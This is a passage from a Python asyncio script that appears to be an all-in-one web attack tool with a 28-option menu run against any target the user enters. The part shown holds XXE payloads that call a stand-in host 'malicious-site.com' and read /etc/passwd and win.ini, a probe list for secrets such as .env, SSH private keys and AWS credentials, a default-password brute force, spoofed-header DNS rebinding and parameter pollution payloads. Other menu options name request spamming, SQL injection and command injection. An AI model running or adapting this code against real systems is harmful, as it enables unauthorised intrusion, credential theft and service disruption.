        "X-Forwarded-Proto": "https",
        "X-Forwarded-Host": "evil.com",
        "True-Client-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "X-Cluster-Client-IP": "127.0.0.1"
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"http://{domain}", headers=headers) as response:
                print(f"Rebinding response status: {response.status}")
        except Exception as e:
            print(f"Error in DNS rebinding testing: {e}")

async def information_disclosure_detection(url):
    print(f"Checking for information disclosure at {url}")
    disclosure_files = [
        "/.env", "/config.json", "/config.php", "/settings.py", "/settings.php", "/localsettings.php",
        "/config.yaml", "/config.yml", "/config.xml", "/application.properties", "/appsettings.json",
        "/.htaccess", "/.htpasswd", "/web.config", "/database.yml", "/db_config.php",
        "/debug.log", "/error.log", "/access.log", "/system.log", "/app.log", "/server.log", "/mysql.log",
        "/database.log", "/apache.log", "/nginx.log", "/php_error.log", "/stdout.log", "/stderr.log",
        "/.git", "/.gitignore", "/.git/config", "/.svn", "/.hg", "/.bzr", "/.cvs", "/.idea",
        "/.vscode", "/.DS_Store", "/.editorconfig", "/package.json", "/package-lock.json", "/composer.json",
        "/composer.lock", "/yarn.lock", "/Gemfile", "/Gemfile.lock", "/Pipfile", "/Pipfile.lock",
        "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/database_backup.sql", "/website_backup.tar",
        "/old_version", "/backup_old", "/site_backup.bak", "/dump.sql", "/db.sql", "/database.sql",
        "/database.sqlite", "/db.sqlite3", "/data.json", "/data.xml", "/data.csv", "/dump.rdb", "/redis.rdb",
        "/backup.rdb", "/db.json", "/db.xml", "/passwords.txt", "/creds.txt", "/credentials.json",
        "/.bash_history", "/.ssh/id_rsa", "/.ssh/authorized_keys", "/.aws/credentials", "/.npmrc", "/.docker/config.json",
        "/private.key", "/private.pem", "/jwt.key", "/jwt_token.key", "/cert.pem", "/cert.key", "/id_rsa",
        "/wp-config.php", "/wp-settings.php", "/wp-content/debug.log", "/wp-includes/version.php", 
        "/config/database.php", "/config/app.php", "/config/production.php", "/config/development.php",
        "/settings.ini", "/db.ini", "/config/db.php", "/system/config/config.php", "/config/config.ini",
        "/.env.local", "/.env.production", "/.env.development", "/firebase.json", "/amplify.yml", "/app.yaml",
        "/app.yml", "/cloudbuild.yaml", "/docker-compose.yml", "/docker-compose.override.yml",
        "/Dockerfile", "/terraform.tf", "/terraform.tfvars", "/serverless.yml", "/secrets.yml",
        "/results.json", "/scan_report.html", "/report.txt", "/audit.log", "/scan_results.log",
        "/vulnerabilities.csv", "/vuln_report.json", "/vuln_scan.log"
    ]
    async with aiohttp.ClientSession() as session:
        for file in disclosure_files:
            try:
                async with session.get(urljoin(url, file)) as response:
                    if response.status == 200:
                        print(f"Found potential information disclosure at: {file}")
            except Exception as e:
                print(f"Error in information disclosure detection: {e}")

async def xxe_testing(url):
    print(f"Starting XXE testing on {url}")
    
    xxe_payload = [
        """<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://malicious-site.com/evil.dtd">
        %remote;
        ]>
        <root>&send;</root>""",
        
        """<?xml version="1.0"?>
        <!DOCTYPE test [
        <!ELEMENT test ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <test>&xxe;</test>""",

        """<?xml version="1.0"?>
        <!DOCTYPE data [
        <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
        <data>&xxe;</data>""",

        """<?xml version="1.0"?>
        <!DOCTYPE replace [
        <!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
        ]>
        <data>&ent;</data>"""
    ]
    
    headers = {"Content-Type": "application/xml"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, data=xxe_payload, headers=headers) as response:
                if response.status == 200:
                    print("XXE vulnerability may exist.")
        except Exception as e:
            print(f"Error in XXE testing: {e}")

async def basic_auth_bruteforce(url):
    print(f"Starting basic authentication bruteforce on {url}")
    auth_combinations = [
    ("admin", "admin"), ("user", "password"), ("root", "toor"),
    ("admin", "1234"), ("test", "test"), ("guest", "guest"),
    ("root", "root"), ("user", "user"), ("administrator", "admin123"),
    ("manager", "manager"), ("test", "123456"), ("webmaster", "webmaster"),
    ("api", "api123"), ("service", "service"), ("demo", "demo"),
    ("user", "welcome"), ("sysadmin", "password1"), ("siteadmin", "admin1234")
    ]
    async with aiohttp.ClientSession() as session:
        for username, password in auth_combinations:
            try:
                async with session.get(url, auth=aiohttp.BasicAuth(username, password)) as response:
                    if response.status == 200:
                        print(f"Valid credentials found: {username}/{password}")
                        break
            except Exception as e:
                print(f"Error during basic auth bruteforce: {e}")

async def websocket_security_testing(url):
    print(f"Testing WebSocket security on {url}")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.ws_connect(url) as ws:
                await ws.send_str("ping")
                msg = await ws.receive()
                print(f"Received message: {msg.data}")
        except Exception as e:
            print(f"Error in WebSocket testing: {e}")
async def parameter_pollution_testing(url):
    print(f"Testing parameter pollution on {url}")

    payloads = [
        "id=1&id=2",
        "user=admin&user=guest",
        "page=1&page=2",
        "sort=asc&sort=desc",
        "filter=name&filter=age",
        "category=books&category=electronics",
        "type=public&type=private",
        "lang=en&lang=es",
        "token=abc123&token=xyz456",
        "date=2022-01-01&date=2022-12-31",
        "limit=10&limit=100",
        "session=valid&session=invalid",
        "amount=100&amount=-100",
        "role=user&role=admin",
        "debug=true&debug=false",
        "auth=token123&auth=token456",
        "id[]=1&id[]=2",
        "price_min=0&price_max=100&price_min=50&price_max=200",
        "order_by=date&order_by=name",
        "api_key=test1&api_key=test2",
        "search=apple&search=banana",
        "query=test&query=",
        "active=1&active=0",
        "visible=true&visible=false",
        "include=all&include=none",
        "checkout=enabled&checkout=disabled",
        "currency=USD&currency=EUR",
        "redirect=true&redirect=false",
        "username=guest&username=admin",
        "action=delete&action=update",
        "discount=10&discount=20",
        "order=asc&order=desc",
        "q=search1&q=search2",
        "range=10-20&range=20-30",
        "select=first&select=last",
        "id=1&user=admin&id=2&user=guest",
        "limit=1&limit=1000",
    ]

    async with aiohttp.ClientSession() as session:
        for payload in payloads:
            try:
                async with session.get(f"{url}?{payload}") as response:
                    print(f"Test payload: {payload} -> Status: {response.status}")
            except Exception as e:
                print(f"Error with payload {payload}: {e}")

async def main():
    display_banner()
    while True:
        choice = display_menu()

        if choice == "1":
            domain = input("Enter the target domain (e.g., example.com): ")
            await fetch_subdomains(domain)
        elif choice == "2":
            url = input("Enter target URL: ")
            requests_per_batch = input("Enter the number of requests per batch: ")
            if requests_per_batch.lower() == "b":
                continue
            await spam_get_requests(url, int(requests_per_batch))
        elif choice == "3":
            domain = input("Enter the target domain for port scan (e.g., example.com): ")
            await full_port_scan(domain)
        elif choice == "4":
            url = input("Enter the target URL for directory and sensitive file bruteforcing (e.g., https://example.com/): ")
            await bruteforce_directories_and_sensitive_files(url)
        elif choice == "5":
            url = input("Enter the target URL for SQL Injection testing (e.g., https://example.com/search?q=): ")
            await sql_injection_testing(url)
        elif choice == "6":
            url = input("Enter the target URL for XSS testing (e.g., https://example.com): ")
            await xss_testing(url)
        elif choice == "7":
            domain = input("Enter the target domain for header and SSL/TLS inspection (e.g., example.com): ")
            await inspect_headers_and_ssl(domain)
        elif choice == "8":
            url = input("Enter the target URL for CSRF testing (e.g., https://example.com/login): ")
            await csrf_testing(url)
        elif choice == "9":
            ip = input("Enter the IP address for reverse DNS lookup: ")
            await reverse_dns_lookup(ip)
        elif choice == "10":
            domain = input("Enter the domain for DNS zone transfer testing: ")
            await dns_zone_transfer(domain)
        elif choice == "11":
            url = input("Enter the URL for Open Redirect testing (e.g., https://example.com): ")
            await open_redirect_testing(url)
        elif choice == "12":
            url = input("Enter the URL for Command Injection testing (e.g., https://example.com): ")
            await command_injection_testing(url)
        elif choice == "13":
            domain = input("Enter the domain for CVE exploit checking (e.g., example.com): ")
            await cve_exploit_checker(domain)
        elif choice == "14":
            url = input("Enter the URL for directory and file bruteforcing (e.g., https://example.com): ")
            if not url.startswith("http://") and not url.startswith("https://"):
                print("Invalid URL format. Please include 'http://' or 'https://'")
                continue
            print("\nStarting bruteforce with built-in wordlist of common directories and files...\n")
            await wordlist_customization_bruteforce(url)
            print("\nBruteforcing completed.")
        elif choice == "15":
            url = input("Enter the URL for parameter discovery (e.g., https://example.com): ")
            await parameter_discovery(url)
        elif choice == "16":
            url = input("Enter the URL to detect WAF presence (e.g., https://example.com): ")
            if not url.startswith("http://") and not url.startswith("https://"):
                print("Invalid URL format. Please include 'http://' or 'https://'")
                continue
            print(f"\nInitiating WAF detection on: {url}")
            print("Using custom headers and patterns to attempt WAF detection...\n")
            await waf_detection(url)
            print("\nWAF detection completed.")
        elif choice == "17":
            url = input("Enter the URL for rate limiting test (e.g., https://example.com): ")
            requests_per_second = int(input("Enter requests per second to simulate: "))
            await rate_limiting_test(url, requests_per_second)
        elif choice == "18":
            domain = input("Enter the domain to test for CORS misconfiguration (e.g., example.com): ")
            await cors_misconfiguration_testing(domain)
        elif choice == "19":
            url = input("Enter the URL for weak password detection (e.g., https://example.com/login): ")
            await weak_password_detection(url)
        elif choice == "20":
            url = input("Enter the URL for HTTP methods testing (e.g., https://example.com): ")
            await http_methods_testing(url)
        elif choice == "21":
            url = input("Enter the API endpoint URL for security testing (e.g., https://example.com/api): ")
            await api_security_testing(url)
        elif choice == "22":
            domain = input("Enter the domain for DNS rebinding testing (e.g., example.com): ")
            await dns_rebinding_testing(domain)
        elif choice == "23":
            url = input("Enter the URL for information disclosure testing (e.g., https://example.com): ")
            await information_disclosure_detection(url)
        elif choice == "24":
            url = input("Enter the URL for XXE testing (e.g., https://example.com): ")
            await xxe_testing(url)
        elif choice == "25":
            url = input("Enter the URL for Basic Authentication Bruteforce (e.g., https://example.com): ")
            await basic_auth_bruteforce(url)
        elif choice == "26":
            url = input("Enter the WebSocket URL for security testing (e.g., wss://example.com/socket): ")
            await websocket_security_testing(url)
        elif choice == "27":
            url = input("Enter the URL for parameter pollution testing (e.g., https://example.com): ")
            await parameter_pollution_testing(url)
        elif choice == "28":
            print("Exiting...")
            break
        else:
            print("Invalid selection. Please choose a valid option.")

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("The program was terminated by the user.")
